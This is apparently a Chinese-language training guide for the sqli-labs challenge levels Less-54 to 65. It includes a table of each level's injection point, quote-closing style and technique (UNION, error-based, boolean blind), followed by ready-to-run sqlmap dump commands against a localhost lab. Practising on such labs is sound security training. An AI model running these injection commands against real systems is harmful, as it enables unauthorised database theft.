# 挑战关卡 (Less-54 ~ Less-65)

## 挑战规则

- 数据库名、表名、列名均为**随机生成**（每次 Setup 重置都会变化）
- 限制了尝试次数（通常 **10 次** GET/POST 请求）
- 需要先枚举结构，再用真实表名精确 dump
- 盲注关在 10 次请求内猜出随机表名极具挑战

## 策略建议

```bash
# 错误做法：直接 --dump（枚举 DB -> 表 -> 列 -> dump，请求数超限）
sqlmap -u "..." --dump

# 正确做法：先枚举结构，再精确 dump
sqlmap -u "..." --dbs --tables --technique=E --threads=5
# 拿到真实表名后：
sqlmap -u "..." -D security -T kv3m9s --dump
```

## 注入类型对照

| Less | 方法 | 闭合方式 | 注入技术 |
|------|------|---------|---------|
| 54 | GET | `'id'` 单引号 | UNION |
| 55 | GET | `id` 数字型 | UNION |
| 56 | GET | `('id')` 单引号+括号 | UNION |
| 57 | GET | `"id"` 双引号 | UNION |
| 58 | POST | `'uname'` 单引号 | Error |
| 59 | POST | `uname` 数字型 | Error |
| 60 | POST | `('uname')` 单引号+括号 | Error |
| 61 | POST | `('uname')` 单引号+括号 | Error |
| 62 | GET | `('id')` 单引号+括号 | Boolean 盲注 |
| 63 | GET | `'id'` 单引号 | Boolean 盲注 |
| 64 | GET | `("id")` 双引号+括号 | Boolean 盲注 |
| 65 | GET | `('id')` 单引号+括号 | Boolean 盲注 |

## 配置

```bash
TARGET="http://localhost:8080"
RESULTS_DIR="./results"
```

## 执行命令

### Less-54: 单引号 + 随机表名（UNION）

```bash
sqlmap -u "$TARGET/Less-54/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-54"
```

### Less-55: 数字型 + 随机表名（UNION）

```bash
sqlmap -u "$TARGET/Less-55/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-55"
```

### Less-56: 单引号+括号 + 随机表名（UNION）

```bash
sqlmap -u "$TARGET/Less-56/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-56"
```

### Less-57: 双引号 + 随机表名（UNION）

```bash
sqlmap -u "$TARGET/Less-57/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-57"
```

### Less-58: POST + 单引号 + 报错注入

```bash
sqlmap -u "$TARGET/Less-58/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=E --dump --output-dir="$RESULTS_DIR/Less-58"
```

### Less-59: POST + 数字型 + 报错注入

```bash
sqlmap -u "$TARGET/Less-59/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=E --dump --output-dir="$RESULTS_DIR/Less-59"
```

### Less-60: POST + 单引号+括号 + 报错注入

```bash
sqlmap -u "$TARGET/Less-60/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=E --dump --output-dir="$RESULTS_DIR/Less-60"
```

### Less-61: POST + 单引号+括号 + 报错注入

```bash
sqlmap -u "$TARGET/Less-61/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=E --dump --output-dir="$RESULTS_DIR/Less-61"
```

### Less-62: 单引号+括号 + 布尔盲注

```bash
sqlmap -u "$TARGET/Less-62/?id=1" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-62"
```

### Less-63: 单引号 + 布尔盲注

```bash
sqlmap -u "$TARGET/Less-63/?id=1" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-63"
```

### Less-64: 双引号+括号 + 布尔盲注

```bash
sqlmap -u "$TARGET/Less-64/?id=1" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-64"
```

### Less-65: 单引号+括号 + 布尔盲注

```bash
sqlmap -u "$TARGET/Less-65/?id=1" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-65"
```

## 请求次数不足时

1. 回到靶场首页点击 **"Setup/reset Database for labs"** 重置
2. 表名会重新生成，之前的结果作废
3. 建议先用 `--tables` 枚举表名，再精确 dump，减少请求量

---

> 参考：[sqlmap 完整手册](sqlmap.md) | [注入类型详解](../notes/injection-types.md) | [靶场总览](../notes/overview.md)
